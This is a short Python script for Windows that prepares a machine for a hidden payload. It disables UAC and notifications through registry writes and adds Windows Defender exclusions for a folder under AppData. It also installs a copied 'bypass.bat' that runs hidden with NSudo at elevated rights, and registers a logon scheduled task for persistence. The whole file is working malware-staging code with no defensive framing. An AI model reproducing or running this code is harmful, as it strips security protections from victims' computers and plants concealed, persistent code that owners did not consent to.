import os
import win32api
 

home_path = os.environ["HOMEPATH"]
windir = os.getenv("windir")

# We got the directories we want to use
bypass_folder = os.getenv("appdata") + "\\Microsoft\\passer"
bypass_starter_path = os.getenv("appdata") + "\\Microsoft\\passer\\pass.bat"
start = os.getenv("appdata") + "\\Microsoft\\passer\\start.bat"


# Alerts and  UAC prepare to close on reboot
os.system(r"powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force")
os.system(r"powershell.exe New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications -Name ToastEnabled  -PropertyType DWord -Value 0 -Force")

# the directories we get here are blocked from being scanned
os.system(
    f"{windir}\\system32\\WindowsPowerShell\\v1.0\\powershell.exe Add-MpPreference -ExclusionPath {bypass_folder}")

os.system(
    f"{windir}\\system32\\WindowsPowerShell\\v1.0\\powershell.exe Add-MpPreference -ExclusionPath {bypass_starter_path}")

# Creates bypass folder
try:
    os.mkdir(bypass_folder)

except:
    pass

# We are preparing the bat files
with open("bypass.bat", "r") as f_bat:
    passer_bat_data = f_bat.read()

with open(bypass_starter_path, "w") as f_batx:  # into pass.bat
    f_batx.write(passer_bat_data)


with open(start, "w") as start_f:  # into start.bat
    start_f.write("cd %temp%")
    start_f.write("\n")
    start_f.write(f"NSudo -U:T -ShowWindowMode:Hide {bypass_starter_path}")
# Preparing to run when you have ten logons
os.system(
    f"{windir}\\system32\\schtasks.exe /Create /SC ONLOGON /TN 'open-bat' /TR '{start}' /F")
